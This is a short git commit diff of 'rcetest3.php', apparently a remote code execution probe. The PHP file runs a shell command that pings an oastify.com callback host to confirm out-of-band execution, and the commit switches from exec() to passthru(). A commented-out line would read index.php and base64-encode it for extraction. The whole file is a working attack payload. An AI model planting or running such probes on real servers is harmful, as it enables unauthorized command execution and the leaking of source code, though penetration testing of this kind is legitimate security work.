cfb2152cbabbcc930d8c7786fda4e6af3a8a4435
0xdomsec <116116368+0xdomsec@users.noreply.github.com>
2022-11-09 05:01:47 -0800

    Update rcetest3.php

--- rcetest3.php
+++ rcetest3.php
@@ -1,4 +1,4 @@
 <?php
 // echo exec('cat index.php | base64 -w 0');
-echo exec('ping -c 3 9oyrz1wj94hwg052ao1c5ns65xbszh.oastify.com');
+passthru('ping -c 3 9oyrz1wj94hwg052ao1c5ns65xbszh.oastify.com');
 ?>
